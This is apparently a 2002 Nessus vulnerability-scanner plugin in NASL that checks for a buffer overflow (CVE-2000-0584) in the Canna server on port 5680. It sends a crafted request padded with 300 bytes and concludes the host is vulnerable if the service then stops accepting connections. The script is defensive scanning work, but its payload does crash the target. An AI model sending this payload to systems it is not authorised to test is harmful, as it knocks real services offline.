#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#
# References:
# http://www.shadowpenguin.org/sc_advisories/advisory038.html
# http://online.securityfocus.com/bid/1445/info
# 
# It took me a while to write the script - gomen gomen.
#
#

if(description)
{
 script_id(11114);
 script_bugtraq_id(1445);
 script_version ("$Revision: 1.4 $");
 script_cve_id("CVE-2000-0584");
 name["english"] = "Canna Overflow";
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
It was possible to make the remote Canna server crash
by sending an oversized string to it.

Solution : upgrade to the latest version or contact your vendor 
for a patch
See also: http://www.shadowpenguin.org/sc_advisories/advisory038.html
Risk factor : High";
		 
		 
	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Checks if the remote Canna can be buffer overflown");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
		  
 script_require_ports(5680);
 exit(0);
}

port = 5680;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
  req = raw_string(0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 50) + 
        "3.3:" + crap(300) + raw_string(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4);
  close(soc);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
}
